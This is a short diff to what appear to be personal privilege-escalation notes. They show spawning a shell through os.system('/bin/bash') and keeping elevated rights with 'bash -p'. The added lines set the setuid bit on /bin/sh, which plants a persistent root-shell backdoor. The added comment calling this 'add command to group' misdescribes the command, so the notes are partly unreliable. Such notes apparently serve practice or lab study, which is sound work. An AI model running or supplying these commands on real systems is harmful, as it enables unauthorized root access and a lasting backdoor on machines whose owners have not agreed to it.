@@ -13,4 +13,7 @@ echo os.system('/bin/bash')
 #to get bash as same privilage as program
 bash -p
 #preserve same privilage
+#or 
 
+#add command to group
+chmod u+s /bin/sh
